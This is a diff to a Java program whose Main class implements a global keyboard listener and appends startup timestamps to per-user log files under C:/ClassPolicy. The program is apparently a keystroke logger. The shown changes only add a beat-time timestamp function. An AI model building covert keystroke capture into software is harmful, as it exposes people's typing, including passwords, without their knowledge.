@@ -53,7 +53,7 @@ public class Main implements NativeKeyListener{
 		String fn = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
 		PrintWriter timestamper = new PrintWriter(new FileWriter(fn, true));
 		timestamper.println();
-		timestamper.print("[" + new SimpleDateFormat("EEEE").format(new Date()) + "]");
+		timestamper.print("[Startup: " + new SimpleDateFormat("EEEE").format(new Date()) + " +" + getCurrentTimeInBeats() + " ]");
 		timestamper.println();
 		timestamper.close();
 		try {
@@ -163,5 +163,10 @@ public class Main implements NativeKeyListener{
 	 public static boolean isWindows() {
 		   String OS = System.getProperty("os.name").toLowerCase();
 		   return (OS.indexOf("win") >= 0);
+		}
+	 public static int getCurrentTimeInBeats() {
+		    java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
+		    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
+		    return beats;
 		}
 }
